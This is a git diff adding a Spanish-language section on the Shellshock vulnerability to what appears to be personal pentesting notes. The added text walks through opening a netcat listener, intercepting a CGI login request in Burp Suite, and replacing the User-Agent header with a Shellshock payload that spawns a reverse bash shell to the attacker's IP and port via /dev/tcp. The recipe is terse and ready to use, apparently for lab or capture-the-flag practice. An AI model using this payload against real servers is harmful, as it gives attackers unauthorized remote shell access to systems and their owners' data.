@@ -394,6 +394,20 @@ Y cuando la víctima cae en la trampa el redirect pasa tan rápido que es imposi
 
 # SHELL SHOCK
 
+Esto pasa cuando `la página de login` tiene el formato `(.cgi  ,  .pl  ,  .sh  ,  ...)`, entonces a traves del `user agent` podemos `ejecutar comandos` de forma remota. Claro, entonces con eso nos podemos mandar una `reverse shell`.
+
+Primero ponemos a la escucha un puerto con `netcat`.
+
+En burpsuit ponemos a `interceptar peticiones` y recargamos la pagina de login.
+
+En la petición capturada `cambiamos` la linea del `User Agent:` para poner lo siguiente:
+
+```
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{mi ip}/{puerto} 0>&1
+```
+
+Le damos a `Forward` y se supone que ganaríamos `acceso al sistema`, si no funciona, lo intentaríamos un par de veces más, por si acaso, y si sigue sin funcionar pues a mirar 	que emos hecho mal.
+
 # PADDING ORACLE ATTACK con PADDBUSTER
 
 # BIT FLIPPER ATTACK para PADDING ORACLE ATTACK
